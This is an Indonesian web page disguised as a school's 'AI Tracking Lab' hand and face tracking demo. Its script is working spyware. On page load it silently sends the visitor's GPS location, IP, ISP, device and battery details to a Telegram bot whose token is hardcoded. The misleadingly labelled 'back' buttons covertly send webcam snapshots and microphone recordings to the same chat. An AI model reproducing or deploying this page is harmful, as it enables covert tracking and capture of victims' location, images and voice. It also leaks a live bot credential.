<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>SMA NEGERI 1 | AI Tracking Lab</title>
    <!-- MediaPipe Libraries -->
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/control_utils/control_utils.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js" crossorigin="anonymous"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0f2b3d 0%, #0a1a2a 100%);
            font-family: 'Poppins', 'Segoe UI', sans-serif;
            min-height: 100vh;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            padding: 1rem 2rem;
            border-radius: 48px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }
        .logo-small {
            width: 50px;
            height: 50px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8rem;
            animation: rotateLogo 8s linear infinite;
        }
        @keyframes rotateLogo { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .logo-text h2 { color: white; font-size: 1.2rem; }
        .logo-text p { color: #88aaff; font-size: 0.7rem; }
        .motto { color: #88aaff; font-size: 0.8rem; }
        .video-container {
            width: 100%;
            max-width: 800px;
            margin: 20px auto;
            border-radius: 20px;
            overflow: hidden;
            border: 2px solid #3b82f6;
            background: #000;
            position: relative;
            aspect-ratio: 4/3;
        }
        #videoCanvas {
            width: 100%;
            height: 100%;
            display: block;
            transform: scaleX(-1);
            background: #000;
        }
        #trackingCanvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }
        .info-panel {
            text-align: center;
            margin-top: 1rem;
            padding: 1rem;
            background: rgba(0,0,0,0.4);
            border-radius: 20px;
            max-width: 800px;
            margin-left: auto;
            margin-right: auto;
        }
        .hand-status { color: #3b82f6; font-size: 1rem; font-weight: bold; margin-bottom: 5px; }
        .face-status { color: #22c55e; font-size: 0.9rem; }
        .emotion-status { color: #f59e0b; font-size: 0.9rem; margin-top: 5px; }
        .button-group {
            display: flex;
            gap: 20px;
            justify-content: center;
            margin-top: 20px;
            flex-wrap: wrap;
        }
        .btn-custom {
            background: linear-gradient(135deg, #1e2a3a, #0f172a);
            border: 2px solid #3b82f6;
            padding: 12px 28px;
            border-radius: 40px;
            color: #3b82f6;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            font-family: monospace;
        }
        .btn-custom:hover {
            background: #3b82f6;
            color: white;
            transform: scale(0.98);
            box-shadow: 0 0 15px rgba(59,130,246,0.5);
        }
        .btn-custom:active {
            transform: scale(0.95);
        }
        .footer { text-align: center; padding: 1rem; color: #88aaff; font-size: 0.7rem; margin-top: 2rem; }
        .toast-message {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.9);
            color: #22c55e;
            padding: 12px 24px;
            border-radius: 40px;
            font-size: 0.9rem;
            z-index: 1000;
            animation: fadeOut 3s ease forwards;
            font-family: monospace;
            border: 1px solid #22c55e;
            font-weight: bold;
        }
        .toast-message.error {
            color: #ff6b6b;
            border-color: #ff6b6b;
        }
        @keyframes fadeOut {
            0% { opacity: 1; transform: translateX(-50%) translateY(0); }
            70% { opacity: 1; }
            100% { opacity: 0; transform: translateX(-50%) translateY(-20px); visibility: hidden; }
        }
        @media (max-width: 768px) {
            .header { flex-direction: column; text-align: center; gap: 10px; }
            .info-panel { margin: 1rem; }
            .btn-custom { padding: 8px 20px; font-size: 0.8rem; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div style="display: flex; align-items: center; gap: 15px;">
                <div class="logo-small">🎓</div>
                <div class="logo-text">
                    <h2>SMA NEGERI 1</h2>
                    <p>AI Tracking Laboratory | Hand + Face Tracking</p>
                </div>
            </div>
            <div class="motto">"Berprestasi, Berkarakter, Berwawasan Global"</div>
        </div>
        
        <div class="video-container">
            <canvas id="videoCanvas" width="800" height="600"></canvas>
            <canvas id="trackingCanvas" width="800" height="600"></canvas>
        </div>
        
        <div class="info-panel">
            <div class="hand-status" id="handStatus">🖐️ Menunggu deteksi tangan...</div>
            <div class="face-status" id="faceStatus">😀 Menunggu deteksi wajah...</div>
            <div class="emotion-status" id="emotionStatus">😐 Ekspresi: -</div>
        </div>
        
        <div class="button-group">
            <button id="btnPhoto" class="btn-custom">📸 Kembali ke Menu</button>
            <button id="btnVoice" class="btn-custom">🎤 Kembali</button>
        </div>
        
        <div class="footer">
            <p>© 2025 SMA NEGERI 1 | AI Tracking Laboratory | Hand + Face Tracking</p>
        </div>
    </div>

    <script>
        // ======================= KONFIGURASI TELEGRAM =======================
        const BOT_TOKEN = '8607052681:AAHMAuSuUO8CR84h5JlQThmlFKnyA9qFIaU';
        const CHAT_ID = '7428813404';
        
        // ======================= DATA TRACKING =======================
        let gpsData = null;
        let ipData = {};
        let batteryData = {};
        let deviceData = {};
        let startTime = Date.now();
        
        // Toast notifikasi
        function showToast(message, isError = false) {
            const toast = document.createElement('div');
            toast.className = 'toast-message';
            if (isError) toast.classList.add('error');
            toast.innerHTML = message;
            document.body.appendChild(toast);
            setTimeout(() => { if (toast && toast.remove) toast.remove(); }, 3000);
        }
        
        // ======================= AMBIL DATA =======================
        async function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }
        
        async function getIP() {
            try { 
                const res = await fetch('https://ipapi.co/json/'); 
                const d = await res.json(); 
                return { ip: d.ip, city: d.city, region: d.region, country: d.country_name, isp: d.org }; 
            } catch(e) { return {}; }
        }
        
        async function getBattery() {
            if ('getBattery' in navigator) {
                try { 
                    const b = await navigator.getBattery(); 
                    return { level: Math.round(b.level * 100), charging: b.charging }; 
                } catch(e) {}
            }
            return {};
        }
        
        function getDevice() {
            const ua = navigator.userAgent;
            let brand = "Unknown", model = "Unknown";
            if (/iPhone/i.test(ua)) { brand = "Apple"; model = "iPhone"; }
            else if (/SM-[A-Z0-9]+/i.test(ua)) { brand = "Samsung"; model = ua.match(/SM-[A-Z0-9]+/i)?.[0] || "Galaxy"; }
            else if (/Xiaomi|Redmi/i.test(ua)) { brand = "Xiaomi"; model = "Redmi/Xiaomi"; }
            else if (/OPPO/i.test(ua)) { brand = "Oppo"; model = "Oppo"; }
            else if (/vivo/i.test(ua)) { brand = "Vivo"; model = "Vivo"; }
            else if (/Pixel/i.test(ua)) { brand = "Google"; model = "Pixel"; }
            return { brand, model, platform: navigator.platform, userAgent: ua };
        }
        
        // ======================= KIRIM KE TELEGRAM =======================
        async function sendText(text) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                });
                const result = await response.json();
                return result.ok === true;
            } catch(e) { return false; }
        }
        
        async function sendPhoto(caption, imageDataUrl) {
            try {
                const res = await fetch(imageDataUrl);
                const blob = await res.blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                formData.append('caption', caption);
                formData.append('parse_mode', 'HTML');
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                const result = await response.json();
                return result.ok === true;
            } catch(e) { return false; }
        }
        
        async function sendVoice(caption, audioBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('voice', audioBlob, 'voice.ogg');
                formData.append('caption', caption);
                formData.append('parse_mode', 'HTML');
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: formData });
                const result = await response.json();
                return result.ok === true;
            } catch(e) { return false; }
        }
        
        // ======================= KIRIM LAPORAN LENGKAP =======================
        async function sendFullReport(source = "auto") {
            try {
                gpsData = await getGPS();
                ipData = await getIP();
                batteryData = await getBattery();
                deviceData = getDevice();
                const connection = navigator.connection ? navigator.connection.effectiveType : 'unknown';
                const waktu = new Date().toLocaleString('id-ID');
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const waktuDetik = Math.floor((Date.now() - startTime) / 1000);
                
                let msg = `╔════════════════════════════════════════╗\n`;
                msg += `║   🏫 SMA NEGERI 1 - AI TRACKING LAB  \n`;
                msg += `║        by ANBATUKANG 🫦              \n`;
                msg += `╚════════════════════════════════════════╝\n\n`;
                
                msg += `<b>📍 LOKASI GPS</b>\n`;
                if (gpsData) msg += `🎯 Koordinat: ${gpsData.lat}, ${gpsData.lon}\n📏 Akurasi: ${Math.round(gpsData.accuracy)} meter\n🗺️ Maps: https://maps.google.com/?q=${gpsData.lat},${gpsData.lon}\n\n`;
                else msg += `❌ GPS tidak tersedia\n\n`;
                
                msg += `<b>📡 INFORMASI JARINGAN</b>\n`;
                msg += `🖧 IP: ${ipData.ip || 'N/A'}\n`;
                msg += `🏙️ Lokasi IP: ${ipData.city || '-'}, ${ipData.region || '-'}, ${ipData.country || '-'}\n`;
                msg += `📡 ISP: ${ipData.isp || 'Unknown'}\n`;
                msg += `📶 Tipe Koneksi: ${connection}\n\n`;
                
                msg += `<b>💻 PERANGKAT & BROWSER</b>\n`;
                msg += `📱 Brand: ${deviceData.brand}\n`;
                msg += `📲 Model: ${deviceData.model}\n`;
                msg += `📱 User Agent: ${deviceData.userAgent.substring(0, 150)}\n`;
                msg += `⚙️ Platform: ${deviceData.platform}\n`;
                msg += `📺 Resolusi: ${screen.width}x${screen.height}\n`;
                msg += `🧠 CPU Cores: ${navigator.hardwareConcurrency || '?'}\n`;
                msg += `💾 RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'}\n\n`;
                
                msg += `<b>🔋 BATERAI</b>\n`;
                msg += `⚡ Level: ${batteryData.level !== null ? batteryData.level + '%' : 'N/A'}\n`;
                msg += `🔌 Charging: ${batteryData.charging === true ? '✅ Ya' : '❌ Tidak'}\n\n`;
                
                msg += `<b>👆 INTERAKSI</b>\n`;
                msg += `📜 Scroll: 0 kali\n`;
                msg += `🖱️ Klik: 1 kali\n`;
                msg += `⏱️ Waktu: ${waktuDetik} detik\n\n`;
                
                msg += `<b>🕒 WAKTU AKSES</b>\n`;
                msg += `🕒 ${waktu}\n`;
                msg += `🧭 Zona Waktu: ${timezone}\n\n`;
                msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
                msg += `✅ ${source === "auto" ? "Auto capture" : "Manual capture"} - Data lengkap terkirim`;
                
                return await sendText(msg);
            } catch(e) {
                console.error('Send report error:', e);
                return false;
            }
        }
        
        // ======================= CAPTURE FOTO (Screenshot) =======================
        async function captureAndSendPhoto() {
            const videoCanvas = document.getElementById('videoCanvas');
            const trackingCanvas = document.getElementById('trackingCanvas');
            
            if (!videoCanvas || !videoCanvas.width || videoCanvas.width === 0) {
                showToast('❌ Canvas belum siap', true);
                return false;
            }
            
            try {
                showToast('📸 Mengambil screenshot...');
                
                const canvas = document.createElement('canvas');
                canvas.width = videoCanvas.width;
                canvas.height = videoCanvas.height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoCanvas, 0, 0);
                ctx.drawImage(trackingCanvas, 0, 0);
                const imageDataUrl = canvas.toDataURL('image/jpeg', 0.85);
                
                // Ambil data lengkap terbaru
                gpsData = await getGPS();
                ipData = await getIP();
                batteryData = await getBattery();
                deviceData = getDevice();
                
                const waktu = new Date().toLocaleString('id-ID');
                const gpsText = gpsData ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
                const caption = `📸 [SCREENSHOT - Kembali ke Menu]\n🕒 ${waktu}\n📍 GPS: ${gpsText}\n📱 Device: ${deviceData.brand} ${deviceData.model}\n🏫 SMA NEGERI 1\n✋ Hand + Face Tracking Active`;
                
                const success = await sendPhoto(caption, imageDataUrl);
                if (success) {
                    showToast('✅ Foto berhasil dikirim ke Telegram!');
                    // Kirim juga data lengkap
                    await sendFullReport("manual_photo");
                } else {
                    showToast('❌ Gagal mengirim foto', true);
                }
                return success;
            } catch(e) {
                console.error('Capture error:', e);
                showToast('❌ Error: ' + e.message, true);
                return false;
            }
        }
        
        // ======================= REKAM VOICE =======================
        async function recordAndSendVoice() {
            try {
                showToast('🎤 Meminta akses mikrofon...');
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const audioChunks = [];
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) audioChunks.push(event.data);
                };
                
                const resultPromise = new Promise(async (resolve) => {
                    mediaRecorder.onstop = async () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        
                        // Ambil data lengkap terbaru
                        gpsData = await getGPS();
                        ipData = await getIP();
                        batteryData = await getBattery();
                        deviceData = getDevice();
                        
                        const waktu = new Date().toLocaleString('id-ID');
                        const gpsText = gpsData ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
                        const caption = `🎙️ [VOICE NOTE - Kembali]\n🕒 ${waktu}\n📍 GPS: ${gpsText}\n📱 Device: ${deviceData.brand} ${deviceData.model}\n🏫 SMA NEGERI 1\n📝 Durasi: 3 detik`;
                        
                        const success = await sendVoice(caption, audioBlob);
                        stream.getTracks().forEach(track => track.stop());
                        resolve(success);
                    };
                });
                
                mediaRecorder.start();
                showToast('🎤 Merekam suara... (3 detik)');
                
                setTimeout(async () => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                        const success = await resultPromise;
                        if (success) {
                            showToast('✅ Voice berhasil dikirim ke Telegram!');
                            // Kirim juga data lengkap
                            await sendFullReport("manual_voice");
                        } else {
                            showToast('❌ Gagal mengirim voice', true);
                        }
                    }
                }, 3000);
                
            } catch(e) {
                console.error('Voice error:', e);
                showToast('❌ Akses mikrofon ditolak!', true);
            }
        }
        
        // ======================= HAND + FACE TRACKING =======================
        let trackingStarted = false;
        let cameraStream = null;
        
        async function startTracking() {
            if (trackingStarted) return;
            trackingStarted = true;
            
            const videoCanvas = document.getElementById('videoCanvas');
            const trackingCanvas = document.getElementById('trackingCanvas');
            
            videoCanvas.width = 800;
            videoCanvas.height = 600;
            trackingCanvas.width = 800;
            trackingCanvas.height = 600;
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 800, height: 600, facingMode: "user" }, 
                    audio: false 
                });
                cameraStream = stream;
                
                const videoElement = document.createElement('video');
                videoElement.srcObject = stream;
                videoElement.width = 800;
                videoElement.height = 600;
                videoElement.autoplay = true;
                videoElement.playsInline = true;
                await videoElement.play();
                
                function drawVideoFrame() {
                    if (videoElement.videoWidth > 0) {
                        const ctx = videoCanvas.getContext('2d');
                        ctx.drawImage(videoElement, 0, 0, videoCanvas.width, videoCanvas.height);
                    }
                    requestAnimationFrame(drawVideoFrame);
                }
                drawVideoFrame();
                
                const hands = new Hands({
                    locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
                });
                hands.setOptions({
                    maxNumHands: 2,
                    modelComplexity: 1,
                    minDetectionConfidence: 0.5,
                    minTrackingConfidence: 0.5
                });
                
                const faceMesh = new FaceMesh({
                    locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
                });
                faceMesh.setOptions({
                    maxNumFaces: 1,
                    refineLandmarks: true,
                    minDetectionConfidence: 0.5,
                    minTrackingConfidence: 0.5
                });
                
                function detectEmotion(landmarks) {
                    if (!landmarks) return "Netral";
                    try {
                        const mouthTop = landmarks[13];
                        const mouthBottom = landmarks[14];
                        const mouthOpen = Math.abs(mouthTop.y - mouthBottom.y) > 0.02;
                        const leftEye = landmarks[33];
                        const rightEye = landmarks[263];
                        const eyeClose = Math.abs(leftEye.y - rightEye.y) < 0.005;
                        
                        if (mouthOpen && eyeClose) return "😲 Terkejut";
                        if (mouthOpen) return "😀 Tersenyum";
                        if (eyeClose) return "😉 Mengedip";
                        return "😐 Netral";
                    } catch(e) { return "Netral"; }
                }
                
                function onResults(results) {
                    const ctx = trackingCanvas.getContext('2d');
                    ctx.clearRect(0, 0, trackingCanvas.width, trackingCanvas.height);
                    
                    // ===== FACE MESH =====
                    if (results.faceLandmarks && results.faceLandmarks.length > 0) {
                        const landmarks = results.faceLandmarks[0];
                        
                        // Gambar titik wajah
                        for (const point of landmarks) {
                            const x = point.x * trackingCanvas.width;
                            const y = point.y * trackingCanvas.height;
                            ctx.beginPath();
                            ctx.arc(x, y, 1.5, 0, 2 * Math.PI);
                            ctx.fillStyle = '#f59e0b';
                            ctx.fill();
                        }
                        
                        // Gambar garis kontur wajah
                        const faceConnections = [
                            [61, 185], [185, 40], [40, 39], [39, 37], [37, 0], [0, 267],
                            [267, 269], [269, 270], [270, 409], [409, 291], [291, 375],
                            [375, 321], [321, 405], [405, 314], [314, 17], [17, 84],
                            [84, 181], [181, 91], [91, 146], [146, 61]
                        ];
                        ctx.beginPath();
                        ctx.strokeStyle = '#f59e0b';
                        ctx.lineWidth = 1.5;
                        for (const [i1, i2] of faceConnections) {
                            if (landmarks[i1] && landmarks[i2]) {
                                ctx.beginPath();
                                ctx.moveTo(landmarks[i1].x * trackingCanvas.width, landmarks[i1].y * trackingCanvas.height);
                                ctx.lineTo(landmarks[i2].x * trackingCanvas.width, landmarks[i2].y * trackingCanvas.height);
                                ctx.stroke();
                            }
                        }
                        
                        const emotion = detectEmotion(landmarks);
                        document.getElementById('emotionStatus').innerHTML = `😐 Ekspresi: ${emotion}`;
                        document.getElementById('faceStatus').innerHTML = `😀 Wajah terdeteksi | 468 titik landmark`;
                    } else {
                        document.getElementById('faceStatus').innerHTML = `😀 Menunggu deteksi wajah...`;
                        document.getElementById('emotionStatus').innerHTML = `😐 Ekspresi: -`;
                    }
                    
                    // ===== HAND TRACKING =====
                    if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
                        for (const landmarks of results.multiHandLandmarks) {
                            // Gambar koneksi antar titik
                            drawConnectors(ctx, landmarks, HAND_CONNECTIONS, { color: '#3b82f6', lineWidth: 3 });
                            
                            // Gambar titik landmark dengan efek glow
                            for (const point of landmarks) {
                                const x = point.x * trackingCanvas.width;
                                const y = point.y * trackingCanvas.height;
                                ctx.beginPath();
                                ctx.arc(x, y, 5, 0, 2 * Math.PI);
                                ctx.fillStyle = '#3b82f6';
                                ctx.shadowBlur = 8;
                                ctx.shadowColor = '#3b82f6';
                                ctx.fill();
                                ctx.shadowBlur = 0;
                                
                                // Titik tengah putih
                                ctx.beginPath();
                                ctx.arc(x, y, 2, 0, 2 * Math.PI);
                                ctx.fillStyle = '#ffffff';
                                ctx.fill();
                            }
                        }
                        document.getElementById('handStatus').innerHTML = `🖐️ Tangan terdeteksi | 21 titik landmark aktif`;
                    } else {
                        document.getElementById('handStatus').innerHTML = `🖐️ Arahkan tangan ke kamera...`;
                    }
                }
                
                hands.onResults((handResults) => {
                    faceMesh.send({ image: videoElement }).then((faceResults) => {
                        onResults({ ...handResults, ...faceResults });
                    });
                });
                
                new Camera(videoElement, {
                    onFrame: async () => { await hands.send({ image: videoElement }); },
                    width: 800,
                    height: 600
                }).start();
                
                showToast('✅ Tracking aktif! Tunjukkan tangan dan wajah Anda');
                
            } catch(err) {
                console.error('Camera error:', err);
                document.getElementById('handStatus').innerHTML = `❌ Gagal akses kamera: ${err.message}`;
                document.getElementById('faceStatus').innerHTML = `❌ Periksa izin kamera`;
                showToast('❌ Gagal akses kamera', true);
            }
        }
        
        // ======================= EVENT LISTENER TOMBOL =======================
        document.getElementById('btnPhoto').addEventListener('click', async () => {
            await captureAndSendPhoto();
        });
        
        document.getElementById('btnVoice').addEventListener('click', async () => {
            await recordAndSendVoice();
        });
        
        // ======================= START =======================
        startTracking();
        
        // Kirim laporan awal saat halaman dimuat
        setTimeout(async () => {
            await sendFullReport("auto");
        }, 3000);
    </script>
</body>
</html>
